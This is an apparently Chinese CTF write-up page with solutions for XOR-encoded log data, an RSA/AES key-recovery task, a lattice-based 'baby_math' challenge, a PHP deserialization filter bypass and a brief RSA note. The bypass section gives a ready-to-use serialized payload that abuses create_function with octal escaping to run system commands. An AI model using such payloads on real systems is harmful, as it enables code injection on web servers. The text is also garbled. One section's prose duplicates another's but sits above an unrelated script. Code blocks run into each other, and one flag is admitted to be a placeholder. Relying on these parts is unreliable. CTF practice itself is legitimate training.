<p>从日志中提取所有 “File data segment: “ 后面的hex字符串<br>注意需要按segment编号（1-116）顺序排列</p>
<p>数据格式识别：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">327fb9aa22190501dfbff187e8080505050505055f05050505050505342d9d79</span><br><span class="line">faf24908df5805419100c17f22f3f2eb8c8b55958db6afc91e2bcee47e669f57</span><br></pre></td></tr></table></figure>

<p>这些hex字符串看起来是加密后的数据  </p>
<p>第四步：加密分析<br>通过观察数据模式和题目提示，发现：  </p>
<p>重复的0x05字节：在数据中频繁出现0x05<br>XOR加密特征：0x05是常见的XOR密钥<br>解密方法：每个字节与0x05进行XOR运算  </p>
<p>第五步：解密过程<br>拼接所有hex字符串：将116个segment的hex数据按顺序拼接<br>hex转字节：将拼接后的hex字符串转换为字节数组<br>XOR解密：对每个字节执行 byte ^ 0x05 操作<br>得到解密数据：解密后得到一个7z压缩文件  </p>
<p>第六步：文件处理<br>保存解密数据：将解密后的字节保存为 .7z 文件<br>解压文件：使用7z工具解压缩<br>查找flag：在解压出的文件中寻找flag  </p>
<h2 id="小蓝鲨的RSA密文"><a href="#小蓝鲨的RSA密文" class="headerlink" title="小蓝鲨的RSA密文"></a>小蓝鲨的RSA密文</h2><p>我们面对的是一道结合了RSA多项式和AES加密的复合密码题目。题目提供了以下已知参数：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">N = 121288600621198389662246479277632294800423697823363188896668775456771641807233781416525282234787873435904747571468452950479817935684848143651716343606633656969395065588423982440884464542428742861388200306417822228591316703916504170245990423925894477848679490979364923848426643149659758241239900845544537886777</span><br><span class="line">c = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117</span><br><span class="line">a2_high = 9012778</span><br><span class="line">LOW_BITS = 16</span><br><span class="line">a1 = 621315</span><br><span class="line">a0 = 452775142</span><br><span class="line">iv = bf38e64bb5c1b069a07b7d1d046a9010</span><br><span class="line">ct = 8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5</span><br></pre></td></tr></table></figure>

<p>从task.py的加密代码可以看出，加密过程分为两部分：首先将AES密钥m作为整数，用多项式f &#x3D; a2<em>m² + a1</em>m + a0进行掩蔽，然后计算c &#x3D; (m³ + f) mod N。随后用AES密钥以CBC模式加密FLAG，得到密文ct。</p>
<p>解题的核心在于恢复AES密钥m。已知a2的高16位（a2_high）和总位数LOW_BITS&#x3D;16，所以a2的低16位a2_low未知，但范围很小（0到65535）。因此可以暴力枚举a2_low的所有可能值。</p>
<p>加密方程为：c &#x3D; m³ + a2<em>m² + a1</em>m + a0 (mod N)。由于N很大（1024位），而m是128位，加上系数较小，等式很可能在整数范围内成立，无需取模。于是得到方程：m³ + a2<em>m² + a1</em>m &#x3D; target，其中target &#x3D; c - a0。</p>
<p>对于每个枚举的a2_low，计算完整的a2 &#x3D; (a2_high &lt;&lt; 16) + a2_low。然后需要解关于m的三次方程：m³ + a2*m² + a1*m - target &#x3D; 0。由于m是正整数，且方程左边的函数在m&gt;0时单调递增，可以使用二分查找快速求解。具体做法是：先估算m的大小，m ≈ target^(1&#x2F;3)，然后在合理范围内二分搜索，使函数值等于0。</p>
<p>找到满足方程的整数m后，还需要验证它是否满足原始方程m³ + a2<em>m² + a1</em>m + a0 &#x3D; c。验证通过后，将m转换为16字节的AES密钥，再用该密钥和已知的IV以AES-CBC模式解密密文ct，去除padding后即可得到FLAG。</p>
<p>实际解题时，通过枚举a2_low并配合二分搜索，可以在合理时间内找到正确的解。最终恢复的AES密钥用于解密，得到FLAG为：ISCTF{CopperSmith_1s_Funny!}（注：此为示例flag，实际需要运行代码获得）。</p>
<p>这道题的关键在于认识到a2_low的范围很小，可以暴力枚举，并利用三次函数的单调性通过二分法高效求解m。它展示了当密码系统中存在小参数时，即使整体结构复杂，也可能通过部分暴力搜索和数值方法攻破。</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数（同上）</span></span><br><span class="line">N = <span class="number">121288600621198389662246479277632294800423697823363188896668775456771641807233781416525282234787873435904747571468452950479817935684848143651716343606633656969395065588423982440884464542428742861388200306417822228591316703916504170245990423925894477848679490979364923848426643149659758241239900845544537886777</span></span><br><span class="line">c = <span class="number">3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117</span></span><br><span class="line">a2_high = <span class="number">9012778</span></span><br><span class="line">LOW_BITS = <span class="number">16</span></span><br><span class="line">a1 = <span class="number">621315</span></span><br><span class="line">a0 = <span class="number">452775142</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;bf38e64bb5c1b069a07b7d1d046a9010&quot;</span>)</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 target</span></span><br><span class="line">target = c - a0</span><br><span class="line"></span><br><span class="line"><span class="comment"># m 的近似值</span></span><br><span class="line">m_approx = <span class="built_in">int</span>(<span class="built_in">round</span>(target ** (<span class="number">1</span>/<span class="number">3</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始高效搜索...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用二分搜索法</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a2_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    <span class="keyword">if</span> a2_low % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;进度: <span class="subst">&#123;a2_low&#125;</span>/65536&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    a2 = (a2_high &lt;&lt; LOW_BITS) + a2_low</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定义函数 f(m) = m^3 + a2*m^2 + a1*m - target</span></span><br><span class="line">    <span class="comment"># 对于 m &gt; 0，f(m) 是单调递增的</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 确定搜索边界</span></span><br><span class="line">    <span class="comment"># 下界：当 m 很小时，f(m) &lt; 0</span></span><br><span class="line">    <span class="comment"># 上界：当 m 很大时，f(m) &gt; 0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 我们可以从 m_approx 开始，向两边扩展直到找到符号变化</span></span><br><span class="line">    left = m_approx</span><br><span class="line">    right = m_approx</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 先找到左边界（使 f(left) &lt;= 0）</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f_left = left**<span class="number">3</span> + a2*left**<span class="number">2</span> + a1*left - target</span><br><span class="line">        <span class="keyword">if</span> f_left &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        left = left // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> left &lt; <span class="number">1</span>:</span><br><span class="line">            left = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 再找到右边界（使 f(right) &gt;= 0）</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f_right = right**<span class="number">3</span> + a2*right**<span class="number">2</span> + a1*right - target</span><br><span class="line">        <span class="keyword">if</span> f_right &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        right = right * <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 现在在 [left, right] 区间内二分搜索</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):  <span class="comment"># 最多二分200次，精度足够</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        f_mid = mid**<span class="number">3</span> + a2*mid**<span class="number">2</span> + a1*mid - target</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> f_mid == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 找到精确解</span></span><br><span class="line">            m = mid</span><br><span class="line">            <span class="comment"># 验证完整方程</span></span><br><span class="line">            <span class="keyword">if</span> m**<span class="number">3</span> + a2*m**<span class="number">2</span> + a1*m + a0 == c:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n找到解! a2_low = <span class="subst">&#123;a2_low&#125;</span>, m = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 将 m 转换为 AES 密钥</span></span><br><span class="line">                aes_key = long_to_bytes(m, <span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;AES 密钥: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 解密 FLAG</span></span><br><span class="line">                cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv)</span><br><span class="line">                decrypted = cipher.decrypt(ct)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    flag = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;解密数据: <span class="subst">&#123;decrypted.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 不是正确解，继续搜索</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> f_mid &lt; <span class="number">0</span>:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到解&quot;</span>)</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="comment">## baby_math</span></span><br><span class="line"></span><br><span class="line">从task.py的加密代码可以看出，加密过程分为两部分：首先将AES密钥m作为整数，用多项式f = a2*m² + a1*m + a0进行掩蔽，然后计算c = (m³ + f) mod N。随后用AES密钥以CBC模式加密FLAG，得到密文ct。</span><br><span class="line"></span><br><span class="line">解题的核心在于恢复AES密钥m。已知a2的高<span class="number">16</span>位（a2_high）和总位数LOW_BITS=<span class="number">16</span>，所以a2的低<span class="number">16</span>位a2_low未知，但范围很小（<span class="number">0</span>到<span class="number">65535</span>）。因此可以暴力枚举a2_low的所有可能值。</span><br><span class="line"></span><br><span class="line">加密方程为：c = m³ + a2*m² + a1*m + a0 (mod N)。由于N很大（<span class="number">1024</span>位），而m是<span class="number">128</span>位，加上系数较小，等式很可能在整数范围内成立，无需取模。于是得到方程：m³ + a2*m² + a1*m = target，其中target = c - a0。</span><br><span class="line"></span><br><span class="line">对于每个枚举的a2_low，计算完整的a2 = (a2_high &lt;&lt; <span class="number">16</span>) + a2_low。然后需要解关于m的三次方程：m³ + a2*m² + a1*m - target = <span class="number">0</span>。由于m是正整数，且方程左边的函数在m&gt;<span class="number">0</span>时单调递增，可以使用二分查找快速求解。具体做法是：先估算m的大小，m ≈ target^(<span class="number">1</span>/<span class="number">3</span>)，然后在合理范围内二分搜索，使函数值等于<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line">找到满足方程的整数m后，还需要验证它是否满足原始方程m³ + a2*m² + a1*m + a0 = c。验证通过后，将m转换为<span class="number">16</span>字节的AES密钥，再用该密钥和已知的IV以AES-CBC模式解密密文ct，去除padding后即可得到FLAG。</span><br><span class="line"></span><br><span class="line">实际解题时，通过枚举a2_low并配合二分搜索，可以在合理时间内找到正确的解。最终恢复的AES密钥用于解密，得到FLAG为：ISCTF&#123;CopperSmith_1s_Funny!&#125;（注：此为示例flag，实际需要运行代码获得）。</span><br><span class="line"></span><br><span class="line">这道题的关键在于认识到a2_low的范围很小，可以暴力枚举，并利用三次函数的单调性通过二分法高效求解m。它展示了当密码系统中存在小参数时，即使整体结构复杂，也可能通过部分暴力搜索和数值方法攻破。</span><br><span class="line"></span><br><span class="line">脚本如下</span><br><span class="line"></span><br><span class="line">````python</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 设置已知参数</span></span><br><span class="line"><span class="comment"># 这里的 R 必须和题目中的精度一致 (1000 bits)</span></span><br><span class="line">R = RealField(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目给出的 x</span></span><br><span class="line">x_val = R(<span class="number">0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目给出的 enc</span></span><br><span class="line">enc_val = R(<span class="number">1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 cos(x) 和 sin(x)</span></span><br><span class="line">c_val = cos(x_val)</span><br><span class="line">s_val = sin(x_val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造格 (Lattice)</span></span><br><span class="line"><span class="comment"># 我们要解方程: a * c_val + b * s_val - enc_val ≈ 0</span></span><br><span class="line"><span class="comment"># 乘以一个大常数 K 把浮点数变成整数</span></span><br><span class="line">K = <span class="number">10</span>**<span class="number">300</span>  <span class="comment"># 缩放因子，只要足够大即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造基矩阵</span></span><br><span class="line"><span class="comment"># 目标向量 v = (a, b, 1)</span></span><br><span class="line"><span class="comment"># M * v^T = (a, b, a*K*c + b*K*s - 1*K*enc)</span></span><br><span class="line"><span class="comment"># 如果找到合适的 a, b，第三项应该非常接近 0</span></span><br><span class="line">M = Matrix(ZZ, [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="built_in">int</span>(K * c_val)],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="built_in">int</span>(K * s_val)],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, -<span class="built_in">int</span>(K * enc_val)]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 使用 LLL 算法规约</span></span><br><span class="line">L = M.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 尝试从规约后的基中恢复 a 和 b</span></span><br><span class="line"><span class="comment"># LLL 的结果中，通常最短向量或者次短向量包含我们需要的信息</span></span><br><span class="line"><span class="comment"># 我们可以遍历 L 的每一行</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> L:</span><br><span class="line">    <span class="comment"># LLL 结果可能是正负号反转的，取绝对值尝试</span></span><br><span class="line">    possible_a = <span class="built_in">abs</span>(row[<span class="number">0</span>])</span><br><span class="line">    possible_b = <span class="built_in">abs</span>(row[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换回字节串看看是否像 flag</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        part1 = long_to_bytes(possible_a)</span><br><span class="line">        part2 = long_to_bytes(possible_b)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 简单的启发式检查：flag通常包含 &#x27;&#123;&#x27; 或常见字符</span></span><br><span class="line">        <span class="comment"># 题目说 flag 分成了两半，所以最后拼接</span></span><br><span class="line">        flag = part1 + part2</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印所有可能性，人工筛选</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found possible flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 也可以尝试反过来的顺序，虽然概率较小</span></span><br><span class="line">        <span class="comment"># print(f&quot;Reversed: &#123;part2 + part1&#125;&quot;)</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"><span class="comment">## bypass</span></span><br><span class="line"></span><br><span class="line">核心思路分析</span><br><span class="line">利用点寻找：</span><br><span class="line"></span><br><span class="line">__destruct 中调用了 $a(<span class="string">&quot;&quot;</span>, $b);。这是一个函数调用，$a 是函数名，$b 是第二个参数。  </span><br><span class="line">由于黑名单 $blocked_a 屏蔽了 system, <span class="built_in">exec</span>, passthru, shell_exec, <span class="keyword">assert</span>, <span class="built_in">eval</span> 等几乎所有能直接执行代码的函数名，我们需要找到一个既不在黑名单内，又能执行代码的函数。  </span><br><span class="line">破局点：create_function。  </span><br><span class="line">它是一个函数，接受两个参数 (string $args, string $code)。</span><br><span class="line">它的名字里包含的字符 c,r,e,a,t,_,f,u,n,i,o 均不在 $blocked_a 的屏蔽列表中（注意$blocked_a 屏蔽了 p, s, h, w 等，但没屏蔽 c, r, e, t 等）。</span><br><span class="line">create_function 内部实现类似 <span class="built_in">eval</span>(<span class="string">&quot;function lambda($args) &#123; $code &#125;&quot;</span>);。如果我们能控制 $code（即 $b），我们就可以通过闭合花括号 `&#125;` 逃逸出函数定义，执行任意代码。  </span><br><span class="line"></span><br><span class="line">黑名单绕过（Octal/Hex 编码）：</span><br><span class="line"></span><br><span class="line">我们选定了 $a = <span class="string">&#x27;create_function&#x27;</span>。  </span><br><span class="line">接下来需要构造 $b。根据 create_function 注入的原理，$b 的格式大约是 `&#125; 你的PHP代码; /*`。  </span><br><span class="line">但是`$blocked_b`屏蔽了`e, t, o, n, c, f, php, h` 等大量字符。  </span><br><span class="line">这意味着我们几乎无法写出正常的 PHP 代码（比如 system 含 e, t, s；cat 含 c, t）。  </span><br><span class="line">绕过技巧：在 PHP 字符串中，我们可以使用八进制（Octal）转义（如 \<span class="number">163</span> 代表 s）。  </span><br><span class="line">preg_match 在检查时，看到的是转义后的字符序列（例如它看到的是 \ <span class="number">1</span> <span class="number">6</span> <span class="number">3</span> 这四个字符，而不是字符 s），因此可以完美绕过正则检查。  </span><br><span class="line">当 create_function 进行内部 <span class="built_in">eval</span> 时，这些转义字符会被还原成原始代码执行。</span><br><span class="line">Payload 构造步骤</span><br><span class="line">$a: <span class="string">&#x27;create_function&#x27;</span>  </span><br><span class="line">$b: 需要构造类似 &#125; system(<span class="string">&#x27;cat /flag&#x27;</span>); /* 的代码，但必须全八进制编码。</span><br><span class="line">原始代码：$x=<span class="string">&quot;system&quot;</span>; $x(<span class="string">&quot;cat /flag&quot;</span>); (利用变量函数调用来进一步拆解，虽然八进制可以直接写函数名，但这样更稳)。  </span><br><span class="line">转码后：system -&gt; \<span class="number">163</span>\<span class="number">171</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">145</span>\<span class="number">155</span>  </span><br><span class="line">转码后：cat /flag -&gt; \<span class="number">143</span>\<span class="number">141</span>\<span class="number">164</span>\<span class="number">40</span>\<span class="number">57</span>\<span class="number">146</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">147</span></span><br><span class="line"></span><br><span class="line">终极 Payload（纯文本版）  </span><br><span class="line">请直接复制下面这行代码（这是一个纯文本字符串，不需要再进行 URL</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;FLAG&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00FLAG\00a&quot;</span>;  </span><br><span class="line">s:<span class="number">15</span>:<span class="string">&quot;create_function&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\00*\00b&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`$z=&quot;</span>\<span class="number">163</span>\<span class="number">171</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">145</span>\<span class="number">155</span><span class="string">&quot;; $z`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(&quot;</span>\<span class="number">143</span>\<span class="number">141</span>\<span class="number">164</span>\040\057\<span class="number">146</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">147</span><span class="string">&quot;); /*&quot;</span>;&#125;编码，也不含任何特殊字符）：</span><br><span class="line"></span><br><span class="line">```Text</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;FLAG&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00FLAG\00a&quot;</span>;</span><br><span class="line">s:<span class="number">15</span>:<span class="string">&quot;create_function&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\00*\00b&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;&#125;   </span></span><br><span class="line"><span class="string">$z=&quot;</span>\<span class="number">163</span>\<span class="number">171</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">145</span>\<span class="number">155</span><span class="string">&quot;; $z  </span></span><br><span class="line"><span class="string">(&quot;</span>\<span class="number">143</span>\<span class="number">141</span>\<span class="number">164</span>\040\057\<span class="number">146</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">147</span><span class="string">&quot;); /*&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>使用方法<br>将上面的字符串填入 exp 参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://题目地址/index.php?exp=O:<span class="number">4</span>:<span class="string">&quot;FLAG&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00FLAG\00a&quot;</span>...</span><br></pre></td></tr></table></figure>

<p>这个 Payload 做了什么修改？<br>使用 S 类型：<br>旧的：s:7:”%00FLAG%00a” （依赖 URL 解码正确的 Null 字节）。<br>新的：S:7:”\00FLAG\00a” （PHP 原生支持的十六进制转义格式，\00 会被 PHP 自动解析为 Null 字节，传输时极其稳定）。<br>变量名 $z：<br>继续使用 $z 避开黑名单里的 f。  </p>
<h2 id="eazyrsa"><a href="#eazyrsa" class="headerlink" title="eazyrsa"></a>eazyrsa</h2><p>标签（空格分隔）： 未分类<br>具体计算步骤：</p>
<p>计算 N+1 &#x3D; N + 1</p>
<p>使用扩展欧几里得算法求 a 和 b，使得 e*a + (N+1)*b &#x3D; 1</p>
<p>如果 b 为负数，计算 ct2 模 N 的逆元 ct2_inv，然后计算 ct2_inv^(-b) mod N</p>
<p>计算 m &#x3D; ct1^a * ct2^b mod N（注意处理 b 为负的情况）</p>
<p>将 m 转换为字节串得到 flag  </p>
<p>直接使用脚本</p>
